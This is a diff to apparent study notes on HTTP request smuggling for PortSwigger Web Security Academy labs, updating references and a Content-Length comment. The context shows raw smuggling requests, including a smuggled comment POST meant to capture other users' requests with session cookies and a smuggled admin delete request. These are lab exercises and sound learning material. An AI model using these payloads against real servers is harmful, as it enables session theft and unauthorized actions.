@@ -11,12 +11,15 @@
 * Make \r\n chars visible.
 * For TE.CL include the trailing sequence \r\n\r\n following the final 0.
 * Install [Request smuggler](https://github.com/portswigger/http-request-smuggler).
-* Schemes are taken from [here](https://medium.com/@muhammadosama0121/http-request-smuggling-f28485cd53dd)
 
 Also this schemes might be useful:
 ![req-smugg-detect](../img/req-smuggling/req-smuggl-detect.jpg "Request smuggling detection scheme")
 
 ![req-smugg-confirm](../img/req-smuggling/req-smuggl-confirm.jpg "Request smuggling confirmation scheme")
+
+Summary by spidersec:
+![spidersec-summary](../img/req-smuggling/spidersec-sum-req-smugg.png)
+
 
 ### CL.TE vulnerabilities
 #### General template
@@ -418,6 +421,7 @@ Method:
 2. wait
 3. check
 4. if there is no admin request then repeat from the beginning
+5. Content-Length: 950 <-- here is the problem point. Find value needed
 ```
 POST / HTTP/1.1
 Host: ...web-security-academy.net
@@ -429,7 +433,7 @@ Content-Length: 337 <-- choose correct CL
 POST /post/comment HTTP/1.1
 Host: ...web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 950 <-- here is the problem point. Find value needed
+Content-Length: 950
 Cookie: session=zWM6D4yrmHTSZaj9VJp8H56otXZlBrHE
 
 csrf=ZMDSgQEpVvv6YYsNwa55uDx9cFR9J6Wx&postId=9&name=1&email=1%401.1&website=https%3A%2F%2Fnormal-user.net&comment=
@@ -739,3 +743,9 @@ Content-Length: CORRECT
 GET /admin/delete?username=carlos HTTP/1.1
 Foo: x
 ```
+
+## Refs
+- https://twitter.com/SpiderSec/status/1200413390339887104
+- some schemes are taken from [here](https://medium.com/@muhammadosama0121/http-request-smuggling-f28485cd53dd)
+- might be useful - https://github.com/defparam/smuggler
+- https://www.thehacker.recipes/web/config/http-request-smuggling/
